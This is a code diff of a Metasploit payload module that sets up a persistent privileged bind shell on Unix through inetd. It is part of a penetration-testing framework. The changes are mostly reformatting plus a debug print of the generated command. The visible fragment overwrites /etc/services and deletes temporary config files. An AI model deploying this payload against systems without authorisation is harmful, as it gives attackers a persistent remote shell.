@@ -8,7 +8,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 487
 
   include Msf::Payload::Single
@@ -16,29 +15,29 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Bind TCP (inetd)',
-      'Description'   => 'Listen for a connection and spawn a command shell (persistent)',
-      'Author'        => 'hdm',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'Privileged'    => true,
-      'RequiredCmd'   => 'inetd',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name' => 'Unix Command Shell, Bind TCP (inetd)',
+                     'Description' => 'Listen for a connection and spawn a command shell (persistent)',
+                     'Author' => 'hdm',
+                     'License' => MSF_LICENSE,
+                     'Platform' => 'unix',
+                     'Arch' => ARCH_CMD,
+                     'Handler' => Msf::Handler::BindTcp,
+                     'Session' => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'cmd',
+                     'Privileged' => true,
+                     'RequiredCmd' => 'inetd',
+                     'Payload' =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
   # Constructs the payload
   #
   def generate
+    vprint_good(command_string)
     return super + command_string
   end
 
@@ -73,7 +72,7 @@ module MetasploitModule
       "cp #{tmp_services} /etc/services;" +
 
       # Delete our configuration file
-      "rm #{tmp_inet} #{tmp_services};";
+      "rm #{tmp_inet} #{tmp_services};"
 
     return cmd
   end
